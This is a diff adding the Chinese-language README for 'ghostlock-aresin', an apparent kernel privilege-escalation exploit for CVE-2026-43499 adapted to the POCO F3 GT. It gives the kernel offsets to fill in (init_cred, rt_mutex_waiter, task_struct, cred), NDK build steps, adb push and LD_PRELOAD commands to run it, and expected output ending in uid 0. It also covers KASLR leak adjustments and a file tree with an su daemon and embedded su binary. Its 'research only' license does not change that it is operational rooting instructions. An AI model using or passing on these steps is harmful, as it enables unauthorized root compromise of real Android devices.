@@ -1,0 +1,64 @@
+INIT_CREDinit_cred 地址/proc/kallsyms 或 GhidraWAITER_*_OFFrt_mutex_waiter 字段偏移pahole / GhidraFAKE_TASK_*_OFFtask_struct 字段偏移pahole / GhidraTASK_CRED_OFFcred 指针偏移pahole / Ghidra
+
+第四步：编译
+
+# 需要 Android NDK r27+ export NDK_ROOT=/path/to/android-ndk-r27 # 或使用 Android Studio 中的 NDK export NDK_ROOT=$HOME/Library/Android/sdk/ndk/27.0.12077973 # 编译 make preload TARGET_HEADER=target.h # 产物: build/bin/preload.so
+
+第五步：测试
+
+# 推送到设备 adb push build/bin/preload.so /data/local/tmp/ adb push build/bin/ghostlock_aresin /data/local/tmp/ 2>/dev/null || true # 运行 adb shell LD_PRELOAD=/data/local/tmp/preload.so /data/local/tmp/ghostlock_aresin # 或用 Shizuku # 在 Shizuku 中执行: LD_PRELOAD=/data/local/tmp/preload.so /data/local/tmp/ghostlock_aresin
+
+📊 预期行为
+
+阶段输出说明初始化[*] GhostLock - aresin (MT6893 D1200) 4.14.186设备识别正确CPU 绑定[+] CPU0 pinned固定到 CPU0地址加载[*] init_task @ 0xffffffc00xxxxxxx固定 LM 地址权限检查[+] uid: xxxxx打印当前 uidKASLR slide[+] slide = 0 或 slide = xxxKASLR 检测触发提权成功后 uid 变 0拿到 root失败[-] ... + 重启内核 panic（漏洞存在但偏移需调整）
+
+⚠️ 重要注意事项
+
+4.14.x vs 6.1.x 内核差异
+
+rt_mutex_waiter 结构不同：
+
+4.14.x 使用 而非 plist_noderb_node
+
+字段偏移完全不同
+
+可能没有 / 字段deadlineww_ctx
+
+task_struct 布局不同：
+
+4.14.x 的 、 等偏移与 6.1.x 不同pi_blocked_onpi_lock
+
+uclamp 相关字段可能不存在于 4.14.x
+
+KASLR 实现不同：
+
+4.14.x 的 KASLR 随机化方式与 6.1.x 不同
+
+泄漏方法可能需要调整
+
+Android 13 vs 14 安全差异：
+
+SELinux 策略可能不同
+
+/proc/self/pagemap 访问限制可能不同
+
+偏移验证
+
+填入偏移后，建议用 Ghidra 交叉验证：
+
+在 Ghidra 中打开 vmlinux.elf
+
+跳转到 结构体rt_mutex_waiter
+
+确认每个字段的偏移与 一致target.h
+
+📁 文件结构
+
+ghostlock-aresin/ ├── README.md # 本文件 ├── Makefile # 编译脚本 ├── target.h # 目标设备偏移定义 (需要填写) ├── src/ # 源码 │ ├── main.c # 主利用逻辑 │ ├── util.c # 工具函数 │ ├── slide.c # KASLR 泄漏 │ ├── fops.c # 文件操作 │ ├── pipe.c # pipe 相关 │ ├── preload.c # LD_PRELOAD 入口 │ ├── su_daemon.c # su 守护进程 │ ├── su_blob.S # su 二进制嵌入 │ ├── standalone.c # 独立运行 │ ├── common.h # 公共定义 │ └── offset.h # 偏移计算 ├── tools/ │ └── extract_offsets.sh # 偏移提取脚本 └── build/ ├── bin/ # 编译产物 └── embed/ # 嵌入文件 
+
+📜 License
+
+For research/educational purposes only. Use at your own risk.
+
+Original PoC: NebuSec/CyberMeowfia → Adapted for: POCO F3 GT (aresin) by ghostlock-aresinIonStack/CVE-2026-43499/exploit/
+
